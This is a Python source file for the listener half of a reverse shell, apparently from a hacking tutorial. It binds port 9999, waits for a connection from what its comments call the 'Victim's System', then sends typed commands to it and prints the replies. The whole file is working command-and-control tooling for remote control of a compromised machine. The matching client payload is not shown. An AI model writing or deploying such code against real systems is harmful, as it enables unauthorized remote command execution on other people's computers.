import sys
import socket

#Creating the Socket for binding it to a port of Victim's System
def create_socket():
    try:
        global host
        global s
        global port
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print('Socket creation error '+str(msg))

#Binding the Socket and listening for connections to the Victim's System
def bind_socket():
    try:
        global host
        global s
        global port
        print('Binding the Port: '+str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print('Socket Binding error '+str(msg)+"\n"+"Retrying.....")
        bind_socket()

#Establishing the connection with client's system(socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print('Connection has been established! |'+' IP '+address[0]+' | Port '+str(address[1]))
    send_commands(conn)
    conn.close()


#Sending commands to the client's system
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


#Calling all the created above function
def main():
    create_socket()
    bind_socket()
    socket_accept()


#Calling all the function created above
main()
